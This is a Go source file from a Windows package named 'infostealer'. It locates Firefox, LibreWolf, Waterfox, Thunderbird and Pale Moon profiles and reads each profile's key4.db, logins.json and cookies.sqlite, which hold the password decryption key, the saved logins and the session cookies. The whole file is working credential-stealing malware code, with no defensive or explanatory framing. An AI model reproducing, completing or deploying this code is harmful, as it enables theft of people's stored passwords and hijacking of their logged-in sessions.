//go:build windows

package infostealer

import (
	"io"
	"os"
	"path/filepath"
)

type supportedGeckoBrowsers []struct {
	Name string
	Path string
}

var geckoBrowsers = supportedGeckoBrowsers{
	{"Firefox", filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")},
	{"LibreWolf", filepath.Join(os.Getenv("APPDATA"), "librewolf", "Profiles")},
	{"Waterfox", filepath.Join(os.Getenv("APPDATA"), "Waterfox", "Profiles")},
	{"Thunderbird", filepath.Join(os.Getenv("APPDATA"), "Thunderbird", "Profiles")},
	{"Palemoon", filepath.Join(os.Getenv("APPDATA"), "Moonchild Productions", "Pale Moon", "Profiles")},
}

type geckoProfile struct {
	Name    string
	Key4DB  []byte
	Cookies []byte
	Logins  []byte
}

type GeckoBrowser struct {
	Name      string
	Localpath string
	Profiles  []geckoProfile
}

func (browsers *supportedGeckoBrowsers) detectBrowsers() []GeckoBrowser {
	var detectedbrowsers []GeckoBrowser
	for _, browser := range *browsers {
		_, err := os.Stat(browser.Path)
		if err == nil {
			detectedbrowsers = append(detectedbrowsers, GeckoBrowser{
				Name:      browser.Name,
				Localpath: browser.Path,
			})
		}
	}
	return detectedbrowsers
}

func (browser *GeckoBrowser) getProfiles() {
	folder, _ := os.ReadDir(browser.Localpath)
	for _, subdir := range folder {
		if !subdir.IsDir() {
			continue
		}
		subdirRead, _ := os.ReadDir(filepath.Join(browser.Localpath, subdir.Name()))
		for _, file := range subdirRead {
			if file.Name() == "key4.db" {
				browser.Profiles = append(browser.Profiles, geckoProfile{
					Name: subdir.Name(),
				})
			}
		}
	}
}

func (browser *GeckoBrowser) getData() {
	for i, profile := range browser.Profiles {
		profiledir := filepath.Join(browser.Localpath, profile.Name)
		handle := readRestrictedFile(filepath.Join(profiledir, "key4.db"))
		sourcefile := os.NewFile(handle, "randombullshit")
		browser.Profiles[i].Key4DB, _ = io.ReadAll(sourcefile)
		handle = readRestrictedFile(filepath.Join(profiledir, "logins.json"))
		sourcefile = os.NewFile(handle, "randombullshit")
		browser.Profiles[i].Logins, _ = io.ReadAll(sourcefile)
		handle = readRestrictedFile(filepath.Join(profiledir, "cookies.sqlite"))
		sourcefile = os.NewFile(handle, "randombullshit")
		browser.Profiles[i].Cookies, _ = io.ReadAll(sourcefile)
	}
}

func Firefox() []GeckoBrowser {
	detectedBrowsers := geckoBrowsers.detectBrowsers()
	for i, _ := range detectedBrowsers {
		detectedBrowsers[i].getProfiles()
		detectedBrowsers[i].getData()
	}
	return detectedBrowsers
}
